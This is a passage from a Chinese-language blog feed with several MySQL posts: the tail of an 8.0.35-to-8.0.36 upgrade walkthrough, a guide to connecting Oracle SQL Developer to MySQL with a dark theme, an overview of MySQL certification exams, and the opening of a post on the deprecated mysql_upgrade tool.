UPGRADE</span><br><span class="line">2024-03-21T04:54:14.689244Z	   18 Query	CHECK TABLE `mysql`.`time_zone_transition_type` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.689878Z	   18 Query	CHECK TABLE `mysql`.`user` FOR UPGRADE</span><br><span class="line">2024-03-21T04:54:14.690560Z	   18 Quit</span><br></pre></td></tr></table></figure></div>
<ol start="5">
<li>準備升級：</li>
</ol>
<p>確認沒有阻礙升級的問題，你可以開始準備升級過程，包括備份數據庫、計劃維護時間窗口等。</p>
<p>由於是測試環境，接下來直接執行升級操作，即，從 MySQL 8.0.35 升級到 8.0.36。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~ 16:48:07]$ yum install ./mysql-community-*</span><br><span class="line">Resolving Dependencies</span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Running transaction check</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-client.x86_64 0:8.0.35-1.el7 will be updated</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-client.x86_64 0:8.0.36-1.el7 will be an update</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-client-plugins.x86_64 0:8.0.35-1.el7 will be updated</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-client-plugins.x86_64 0:8.0.36-1.el7 will be an update</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-common.x86_64 0:8.0.35-1.el7 will be updated</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-common.x86_64 0:8.0.36-1.el7 will be an update</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-devel.x86_64 0:8.0.35-1.el7 will be updated</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-devel.x86_64 0:8.0.36-1.el7 will be an update</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-embedded-compat.x86_64 0:8.0.35-1.el7 will be updated</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-embedded-compat.x86_64 0:8.0.36-1.el7 will be an update</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-icu-data-files.x86_64 0:8.0.35-1.el7 will be updated</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-icu-data-files.x86_64 0:8.0.36-1.el7 will be an update</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-libs.x86_64 0:8.0.35-1.el7 will be updated</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-libs.x86_64 0:8.0.36-1.el7 will be an update</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-libs-compat.x86_64 0:8.0.35-1.el7 will be updated</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-libs-compat.x86_64 0:8.0.36-1.el7 will be an update</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-server.x86_64 0:8.0.35-1.el7 will be updated</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mysql-community-server.x86_64 0:8.0.36-1.el7 will be an update</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Finished Dependency Resolution</span></span><br><span class="line">...</span><br><span class="line">Updated:</span><br><span class="line">  mysql-community-client.x86_64 0:8.0.36-1.el7</span><br><span class="line">  mysql-community-client-plugins.x86_64 0:8.0.36-1.el7</span><br><span class="line">  mysql-community-common.x86_64 0:8.0.36-1.el7</span><br><span class="line">  mysql-community-devel.x86_64 0:8.0.36-1.el7</span><br><span class="line">  mysql-community-embedded-compat.x86_64 0:8.0.36-1.el7</span><br><span class="line">  mysql-community-icu-data-files.x86_64 0:8.0.36-1.el7</span><br><span class="line">  mysql-community-libs.x86_64 0:8.0.36-1.el7</span><br><span class="line">  mysql-community-libs-compat.x86_64 0:8.0.36-1.el7</span><br><span class="line">  mysql-community-server.x86_64 0:8.0.36-1.el7</span><br><span class="line"></span><br><span class="line">Complete!</span><br></pre></td></tr></table></figure></div>
<ol start="6">
<li>升級后檢查，由於 MySQL 已將原有的 mysql_upgrade 功能内置到 mysqld 中，默認情況如果有需要升級，會自動執行。</li>
</ol>
<p>通過 general 日志，可以看到，新版本的 MySQL 服務器在啓動時，自動創建了新表 <code>innodb_redo_log_files</code>。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/sbin/mysqld, Version: 8.0.36 (MySQL Community Server - GPL). started with:</span><br><span class="line">Tcp port: 3306  Unix socket: /var/lib/mysql/mysql.sock</span><br><span class="line">Time                 Id Command    Argument</span><br><span class="line">2024-03-21T08:49:45.542858Z	    0 Execute	CREATE TABLE performance_schema.innodb_redo_log_files(</span><br><span class="line">`FILE_ID` BIGINT NOT NULL COMMENT &#x27;Id of the file.&#x27;,</span><br><span class="line">`FILE_NAME` VARCHAR(2000) NOT NULL COMMENT &#x27;Path to the file.&#x27;,</span><br><span class="line">`START_LSN` BIGINT NOT NULL COMMENT &#x27;LSN of the first block in the file.&#x27;,</span><br><span class="line">`END_LSN` BIGINT NOT NULL COMMENT &#x27;LSN after the last block in the file.&#x27;,</span><br><span class="line">`SIZE_IN_BYTES` BIGINT NOT NULL COMMENT &#x27;Size of the file (in bytes).&#x27;,</span><br><span class="line">`IS_FULL` TINYINT NOT NULL COMMENT &#x27;1 iff file has no free space inside.&#x27;,</span><br><span class="line">`CONSUMER_LEVEL` INT NOT NULL COMMENT &#x27;All redo log consumers registered on smaller levels than this value, have already consumed this file.&#x27;</span><br><span class="line">)engine = &#x27;performance_schema&#x27;</span><br></pre></td></tr></table></figure></div>
<p>總結一下，MySQL Shell 是升級檢查利器，這只是 MySQL Shell 强大功能的冰山一角，還有更多强大的功能，歡迎使用。</p>
<p>– END –</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
<p>如果这篇文章为你带来了灵感或启发，就帮忙点『赞』or『在看』or『转发』吧，这对我非常重要，感谢！(๑˃̵ᴗ˂̵)</p>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>MySQL 8.0</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>mysql 8.0</tag>
        <tag>mysql shell</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 必备工具：SQL Developer</title>
    <url>/2024/mysql/mysql-tool-sql-developer/</url>
    <content><![CDATA[<p>在当今信息化社会中，数据库已经成为了各行各业不可或缺的重要组成部分。而 MySQL 作为开源的关系型数据库管理系统，因其高效、稳定、易用的特点，受到了广大开发者和企业的青睐。</p>
<p>为了更好地管理和操作 MySQL 数据库，选择一款合适的开发工具显得尤为重要。</p>
<h2 id="MySQL-的-GUI-管理工具">MySQL 的 GUI 管理工具</h2>
<p>廣爲人知的 MySQL 的 GUI 管理工具有：</p>
<ol>
<li>
<p><a class="link"   href="https://www.mysql.com/products/workbench/" >MySQL Workbench <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
这是 Oracle 公司开发的一款免费的 MySQL 集成环境。MySQL Workbench 提供了数据建模、SQL开发、数据库管理、用户管理、备份等功能，并支持导入和导出数据，以及与其他数据库进行交互。MySQL Workbench 面向数据库架构师、开发人员和 DBA。 MySQL Workbench 可在 Windows、Linux 和 Mac OS X 上使用。</p>
</li>
<li>
<p><a class="link"   href="https://www.heidisql.com/" >HeidiSQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
HeidiSQL 是免费软件，其目标是易于学习。“Heidi”可让您查看和编辑运行数据库系统 MariaDB、MySQL、Microsoft SQL、PostgreSQL 和 SQLite 的数据和结构。</p>
</li>
<li>
<p><a class="link"   href="https://www.phpmyadmin.net/" >phpMyAdmin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
phpMyAdmin 是一个用 PHP 编写的免费软件工具，旨在通过 Web 处理 MySQL 的管理。 phpMyAdmin 支持 MySQL 和 MariaDB 上的各种操作。 常用的操作（管理数据库、表、列、关系、索引、用户、权限等）可以通过用户界面执行，同时您仍然可以直接执行任何 SQL 语句。</p>
</li>
<li>
<p><a class="link"   href="https://www.navicat.com.cn/" >Navicat for MySQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
Navicat for MySQL 是管理和开发 MySQL 或 MariaDB 的理想解决方案。它是一套单一的应用程序，能同时连接 MySQL 和 MariaDB 数据库，并与 OceanBase 数据库及 Amazon RDS、Amazon Aurora、Oracle Cloud、Microsoft Azure、阿里云、腾讯云和华为云等云数据库兼容。这套全面的前端工具为数据库管理、开发和维护提供了一款直观而强大的图形界面。</p>
</li>
<li>
<p><a class="link"   href="https://dbeaver.io/" >DBeaver <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
DBeaver 是一个通用的数据库管理和开发工具，支持包括 MySQL 在内的几乎所有的数据库产品。它基于 Java 开发，可以运行在 Windows、Linux、macOS 等各种操作系统上。</p>
</li>
<li>
<p><a class="link"   href="https://www.jetbrains.com/zh-cn/datagrip/" >DataGrip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
DataGrip 是一个多引擎数据库环境，使用者无需切换多种数据库工具，即可轻松管理 MySQL 等数据库。DataGrip 支持智能代码补全、实时分析和快速修复特性，並集成了版本控制。</p>
</li>
</ol>
<h2 id="SQL-Developer">SQL Developer</h2>
<p>熟悉 Oracle 的同学都知道 <a class="link"   href="https://docs.oracle.com/en/database/oracle/sql-developer/index.html" >SQL Developer <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，</p>
<p>這是一款由 Oracle 公司开发的集成开发环境（IDE），它专为数据库管理和开发而设计。这款工具提供了从数据库设计、建模、开发到维护的一站式服务，使得开发者能够在一个统一的界面中完成所有的数据库相关工作。</p>
<p>Oracle SQL Developer 是基於 Java 開發的，不僅可以連接到 Oracle 数据库，也可以连接到选定的第三方（非 Oracle）数据库、查看元数据和数据，以及将这些数据库迁移到 Oracle。</p>
<p>比如支持 MySQL。</p>
<h3 id="安装">安装</h3>
<p>直接從 Oracle 網站下載就好。</p>
<p>我這裏已經準備好了安裝包。内置 Java 環境，開箱即用。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqldeveloper-23.1.1.345.2114-x64.zip</span><br></pre></td></tr></table></figure></div>
<img  alt="01version" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240313-ed45062c-6e0f-4bc2-bd31-b03efb37942c.png"
                      referrerpolicy="no-referrer"
                >
<p>Java 版本為 11，IDE 版本為 23.1。</p>
<p>可以按照個人習慣選擇顯示語言，本文示例選擇了【中文】。</p>
<h3 id="配置-JDBC">配置 JDBC</h3>
<p>默認支持連接 Oracle，相關内容可以參考薛老師的文章：</p>
<p><a class="link"   href="https://mp.weixin.qq.com/s/uzV1TwwacdzwQ_OTR6OAjA" >其实很多人不了解SQL Developer <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>如果需要連接到 MySQL 服務器，需要自行添加 MySQL 的 JDBC，關於選擇哪個版本，可參考文章：</p>
<p><a class="link"   href="https://mp.weixin.qq.com/s/PWeDyUXkUuw9t3kdQDraLg" >如何选择适合的 MySQL Connector/J 版本 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>在菜單欄【工具】-》【首選項】-》【數據庫】-》【第三方 JDBC 驅動程式】，</p>
<img  alt="02p" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240313-a4f5858d-ee0e-48ce-8345-b04b5c4bb0d8.png"
                      referrerpolicy="no-referrer"
                >
<p>添加準備好的 JDBC 驅動。</p>
<img  alt="03jdbc" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240313-9f37d1ab-28c2-4ccd-b6f9-0560ef7426de.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="连接-MySQL">连接 MySQL</h3>
<p>現在，我們可以新建 MySQL 的數據庫連接，在【數據庫類型】下拉菜單選擇【MySQL】即可。</p>
<img  alt="04type" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240313-0c4ab344-4a1b-4582-a56e-b4faa580e295.png"
                      referrerpolicy="no-referrer"
                >
<p>连接成功后，可以看到 SQL Developer 的主界面。</p>
<p>在左侧的导航栏中，可以看到数据库中的所有模式（schemas）和对象（如表、视图、索引、过程、函数、触发器等）。</p>
<p>要执行 SQL 查询，可以点击主界面上方的 SQL 编辑器标签，打开一个新的查询窗口。</p>
<p>在查询窗口中，输入 SQL 语句，比如查詢數據庫版本信息。</p>
<img  alt="05select" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240313-8224aea9-6d0f-49d7-8632-2b879743ddb9.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="其他高级功能">其他高级功能</h3>
<p>SQL Developer 還貼心的提供了數據遷移功能，將第三方數據庫遷移到 Oracle。</p>
<img  alt="06migrate" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240313-bb03edf5-e9f8-40a3-995d-9ecbf6d2421e.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="自定义-Dark-色彩">自定义 Dark 色彩</h3>
<p>SQL Developer 允许用户进行自定义和扩展，以满足特定的工作需求。</p>
<p>例如，可以更改界面主题、字体和颜色等设置，以优化用户体验。</p>
<p>举个例子，可以在 SQL Developer 中引入 <a class="link"   href="https://draculatheme.com/oracle-sql-developer" >Dark 色彩 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>模式。</p>
<p>进入文件夹：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">%APPDATA%\SQL Developer\system23.1.1.345.2114\o.ide.12.2.1.6.42.220506.654</span><br></pre></td></tr></table></figure></div>
<p>编辑文件 <code>dtcache.xml</code>:</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line">            <span class="tag">&lt;<span class="name">Item</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">Key</span>&gt;</span>Dark<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">Value</span> <span class="attr">class</span>=<span class="string">&quot;java.util.ArrayList&quot;</span>&gt;</span></span><br><span class="line">...</span><br><span class="line">               <span class="tag">&lt;/<span class="name">Value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>启动 SQL Developer，点击菜單欄【工具】-》【首選項】-》【代码编辑器】-》【PL/SQL 语法颜色】，选择【Dark】方案，【确定】。</p>
<img  alt="dark" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240319-3ff938fa-4961-498f-a8ab-d18554f94122.png"
                      referrerpolicy="no-referrer"
                >
<p>再次连接 DB 后，可以看到 SQL 编辑器已经渲染为 Dark 色彩。</p>
<img  alt="pg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240319-ab00792e-b047-430c-bb82-80622f147011.png"
                      referrerpolicy="no-referrer"
                >
<p>– END. –</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
<p>如果这篇文章为你带来了灵感或启发，就帮忙点『赞』or『在看』or『转发』吧，这对我非常重要，感谢！(๑˃̵ᴗ˂̵)</p>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>MySQL 8.0</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>mysql 8.0</tag>
        <tag>sqldev</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 数据库认证考试介绍（2024 版）</title>
    <url>/2024/mysql/mysql-certification-intro/</url>
    <content><![CDATA[<blockquote>
<p>MySQL is the world’s most popular open source database.<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p>
<p>MySQL 是世界上最流行的开源数据库。</p>
</blockquote>
<p>无论你是数据库初学者还是经验丰富的用户、MySQL 数据库管理员、MySQL 开发人员还是 MySQL 安全管理员，都可以在学习、准备 MySQL 认证过程中加深对 RDBMS 的了解，以便可以更有效地管理 MySQL<br>
应用程序。</p>
<p>MySQL 数据库认证考试，是机遇也是挑战。</p>
<p>MySQL 认证考试可以检验你对 MySQL<br>
数据库的掌握程度，包括基本概念、操作技巧、性能优化、故障处理、备份恢复、企业级特性等多个方面。</p>
<p>挑战在于考试内容广泛且深入，要求你具备扎实的理论基础和丰富的实践经验。同时，考试过程紧张刺激（为了网速稳定而在下半夜考试），需要在有限的时间内迅速准确地回答问题（考试只有2个小时，平均不到2分钟需要答一道题）。</p>
<p>通过该考试，你不仅能够展示自己的专业能力，还能够获得业界认可的证书，为职业生涯发展增添有力支持，更是职业生涯中的一笔财富。</p>
<p>先来浅晒一下作者的 3 张证书。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240317-dd4c2068-4edb-4e0e-a4ed-505b3b7f1b5c.png"
                      referrerpolicy="no-referrer"
                >
<p>那么，MySQL 数据库认证考试有哪些呢？</p>
<p>目前，MySQL 认证考试，分两个领域（Area）：Database Administration 和 Developer。</p>
<p>按水平（Level）分为：Associate，Professional，Specialist。</p>
<p>具体为：</p>
<ul>
<li>MySQL Database Administration
<ol>
<li>Associate: MySQL HeatWave Implementation Certified Associate Rel 1</li>
<li>Professional: Oracle Certified Professional, MySQL 8.0 Database Administrator</li>
<li>Specialist: MySQL 2021 Certified Implementation Specialist</li>
</ol>
</li>
<li>MySQL Developer
<ol>
<li>Professional: MySQL 8.0 Database Developer Oracle Certified Professional</li>
</ol>
</li>
</ul>
<h2 id="MySQL-HeatWave-Implementation-Associate-Rel-1-1Z0-915-1">MySQL HeatWave Implementation Associate Rel 1 (1Z0-915-1)</h2>
<p>MySQL HeatWave 实施认证助理已展示了配置、配置和管理用于事务、分析、机器学习和 Lakehouse 的 MySQL HeatWave 所需的知识。</p>
<p>获得此认证的个人了解如何使用 MySQL HeatWave Lakehouse 管理用户帐户、连接、机器学习和分析。</p>
<h3 id="学习路径">学习路径</h3>
<ul>
<li>创建和管理 MySQL 数据库服务实例</li>
<li>将本地数据库迁移到云端</li>
<li>监控实例并调整资源的使用</li>
<li>配置 MySQL 数据库系统</li>
<li>管理 MySQL 数据库系统</li>
<li>备份 MySQL 数据库系统</li>
<li>将您的数据迁移到 MySQL 数据库服务</li>
<li>MySQL 数据库服务高可用</li>
<li>实施 MySQL HeatWave 来加速查询</li>
</ul>
<h3 id="考试内容">考试内容</h3>
<ul>
<li>MySQL HeatWave Service</li>
<li>Provisioning and Connecting DB systems</li>
<li>Managing DB systems</li>
<li>Backing up and restoring DB systems</li>
<li>MySQL HeatWave Configurations</li>
<li>Read Replicas</li>
<li>Inbound Replication</li>
<li>Data Migrations</li>
<li>High Availability</li>
<li>HeatWave Cluster</li>
<li>HeatWave AutoML</li>
</ul>
<h3 id="考试形式">考试形式</h3>
<ul>
<li>多选题</li>
<li>65 道题</li>
<li>限时 90 分钟</li>
<li>通过分数 60%</li>
</ul>
<h2 id="MySQL-8-0-Database-Administrator-1Z0-908">MySQL 8.0 Database Administrator (1Z0-908)</h2>
<p>Oracle 认证专家、MySQL 8.0 数据库管理员证书承认考生具备 MySQL 架构所需的知识，并具备安装和配置 MySQL 数据库的技能。</p>
<p>该认证表明专业人员具备监控、维护和保护 MySQL 数据库所需的技能。</p>
<p>它还展示了专业人员对如何优化查询性能、实施备份和恢复策略以及实施高可用性技术的掌握。</p>
<h3 id="学习路径-2">学习路径</h3>
<ul>
<li>安装和配置 MySQL 服务器和客户端程序</li>
<li>认识 MySQL 架构的关键组件</li>
<li>管理用户帐户并保护服务器的安全</li>
<li>解决服务器速度下降和其他问题</li>
<li>MySQL 数据库的备份和恢复</li>
<li>配置和管理各种复制拓扑</li>
</ul>
<h3 id="考试内容-2">考试内容</h3>
<ul>
<li>Architecture</li>
<li>Server Installation and Configuration</li>
<li>Security</li>
<li>Monitoring and Maintenance</li>
<li>Query Optimization</li>
<li>Backups and Recovery</li>
<li>High Availability Techniques</li>
</ul>
<h3 id="考试形式-2">考试形式</h3>
<ul>
<li>多选题</li>
<li>73 道题</li>
<li>限时 130 分钟</li>
<li>通过分数 62%</li>
<li>验证版本 MySQL 8.0.18</li>
<li>支持中文试题</li>
</ul>
<h2 id="MySQL-2021-Certified-Implementation-Specialist-1Z0-921">MySQL 2021 Certified Implementation Specialist (1Z0-921)</h2>
<p>经过认证的 MySQL 专家能够充分演示 MySQL 功能（本地和 Oracle 云中）、进行技术讨论和概念验证，并提供完整的 Oracle 云解决方案，其中包括分析服务 (HeatWave) 和带有容器的微服务 (Kubernetes)。</p>
<p>该认证表明了对 MySQL Enterprise Edition 的深入了解，包括：安装、数据库设计、高可用性和复制、安全性、MySQL Enterprise Monitor 和备份。</p>
<p>它还展示了有关 MySQL 数据库服务和 HeatWave 的基础知识。</p>
<h3 id="考试内容-3">考试内容</h3>
<ul>
<li>Oracle MySQL Enterprise Product suite</li>
<li>Installation and Architecture</li>
<li>Database Design</li>
<li>MySQL Security</li>
<li>MySQL Enterprise Monitor</li>
<li>MySQL Backup</li>
<li>MySQL High Availability and Replication</li>
<li>MySQL Database Service and HeatWave</li>
<li>MySQL Kubernetes</li>
</ul>
<h3 id="考试形式-3">考试形式</h3>
<ul>
<li>多选题</li>
<li>52 道题</li>
<li>限时 90 分钟</li>
<li>通过分数 60%</li>
<li>验证版本 MySQL 企业版 8.0 和 MySQL 数据库服务、HeatWave 2021</li>
</ul>
<h2 id="MySQL-8-0-Database-Developer-Oracle-Certified-Professional-1Z0-909">MySQL 8.0 Database Developer Oracle Certified Professional (1Z0-909)</h2>
<p>MySQL 8.0 数据库开发人员 Oracle 认证专业证书承认考生具备使用连接器和 API 以及如何使用 MySQL 数据库支持数据驱动应用程序所需的知识和技能。</p>
<p>该认证表明专业人员可以设计、开发和维护 MySQL 模式对象并控制 SQL 和应用程序中的事务。</p>
<p>它还展示了专业人员对如何优化查询性能、创建和执行存储程序以及管理 JSON 和文档存储的掌握。</p>
<h3 id="学习路径-3">学习路径</h3>
<ul>
<li>使用连接器进行编程</li>
<li>编写控制台和 Web 应用程序</li>
<li>优化查询性能</li>
<li>编写存储例程和触发器</li>
<li>存储、访问和分析地理空间数据</li>
<li>使用 X DevAPI 访问文档存储中的 JSON 数据</li>
</ul>
<h3 id="考试内容-4">考试内容</h3>
<ul>
<li>Connectors and APIs</li>
<li>Data-driven Applications</li>
<li>MySQL Schema Objects and Data</li>
<li>Transactions</li>
<li>Query Optimization</li>
<li>MySQL Stored Programs</li>
<li>JSON and Document Store</li>
</ul>
<h3 id="考试形式-4">考试形式</h3>
<ul>
<li>多选题</li>
<li>65 道题</li>
<li>限时 90 分钟</li>
<li>通过分数 62%</li>
<li>验证版本 MySQL 8.0.18</li>
</ul>
<h2 id="总结">总结</h2>
<p>以上四种 MySQL 认证考试中，OCP MySQL DBA 最为流行广泛，学习资料也最全，还支持中文试题。</p>
<p>总之，MySQL 数据库认证考试是对过往学习、工作的一个阶段性总结和证明。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
<p>如果这篇文章为你带来了灵感或启发，就帮忙点『赞』or『在看』or『转发』吧，这对我非常重要，感谢！(๑˃̵ᴗ˂̵)</p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://education.oracle.com/oracle-certification-path/pFamily_406" >https://education.oracle.com/oracle-certification-path/pFamily_406 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>OCP</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>mysql 8.0</tag>
        <tag>ocp</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 升级：使用 mysql_upgrade 注意事项（再见 mysql_upgrade）</title>
    <url>/2024/mysql/mysql-upgrade-deprecated/</url>
    <content><![CDATA[<p>在数据库管理的世界里，随着技术的不断进步和业务的不断发展，数据库的版本升级成为了一个不可避免的过程。</p>
<p>MySQL 作为业界领先的开源关系型数据库管理系统，其版本迭代与功能优化同样不容忽视。</p>
<p>而在这个过程中，升级工具就显得尤为重要，比如 <code>mysql_upgrade</code>。</p>
<p>但是，<code>mysql_upgrade</code> 已经成为过去式，且来往下看。</p>
<h2 id="mysql-upgrade-介绍">mysql_upgrade 介绍</h2>
<p>mysql_upgrade 是 MySQL 提供的一个用于升级 MySQL 服务器的实用程序。</p>
<p>它检查服务器上的所有数据库，查看是否需要任何更改以利用新版本的 MySQL 服务器提供的特性。</p>
<p>mysql_upgrade 还会升级系统表，以使用当前 MySQL 版本提供的任何新特性。</p>
<p>简而言之，mysql_upgrade 就是一个帮助用户平滑过渡到新版本 MySQL 的桥梁。</p>
<p>使用 mysql_upgrade 的过程相对简单。</p>
<p>首先，停止旧版本的 MySQL 服务，建议用户备份整个数据库，以防万一升级过程中出现问题。</p>
<p>然后，安装新版本的 MySQL 服务器软件，并启动新版本的 MySQL 服务。</p>
<p>最后，运行 mysql_upgrade 命令，它会检查数据库中的表，并根据需要进行升级。</p>
<p>通常只需向几个表添加新字段，或者修改字段长度，或者补充修订数据。</p>
<p>也可能会出现罕见的情况，比如系统表的存储引擎发生变更，比如由 MyISAM 变更为 InnoDB。</p>
<h2 id="mysql-upgrade-使用示例">mysql_upgrade 使用示例</h2>
<p>举个栗子，</p>
<p>从 MySQL 5.7.18 升级到 MySQL 5.7.19，会增加一个 <code>'mysql.session'@'localhost'</code> 保留账户。</p>
<p>该帐户由插件在内部使用来访问服务器。 它被锁定，因此不能用于客户端连接。</p>
<p>具体案例如下：</p>
<p>现在，我们有一个 MySQL 5.7.18 服务器正在运行。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.7.18    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<p>查看用户列表。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select user from mysql.user;</span><br><span class="line">+-----------+</span><br><span class="line">| user      |</span><br><span class="line">+-----------+</span><br><span class="line">| mysql.sys |</span><br><span class="line">| root      |</span><br><span class="line">+-----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<p>我们来停止旧版本的 MySQL 服务。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop mysqld</span><br></pre></td></tr></table></figure></div>
<p>接下来，准备升级到 MySQL 5.7.19，RPM 包已经准备好。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ls m*rpm</span><br><span class="line">mysql-community-client-5.7.19-1.el7.x86_64.rpm</span><br><span class="line">mysql-community-common-5.7.19-1.el7.x86_64.rpm</span><br><span class="line">mysql-community-devel-5.7.19-1.el7.x86_64.rpm</span><br><span class="line">mysql-community-embedded-5.7.19-1.el7.x86_64.rpm</span><br><span class="line">mysql-community-embedded-compat-5.7.19-1.el7.x86_64.rpm</span><br><span class="line">mysql-community-embedded-devel-5.7.19-1.el7.x86_64.rpm</span><br><span class="line">mysql-community-libs-5.7.19-1.el7.x86_64.rpm</span><br><span class="line">mysql-community-libs-compat-5.7.19-1.el7.x86_64.rpm</span><br><span class="line">mysql-community-server-5.7.19-1.el7.x86_64.rpm</span><br></pre></td></tr></table></figure></div>
<p>使用 yum 命令进行升级。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum update mysql-community-*</span><br></pre></td></tr></table></figure></div>
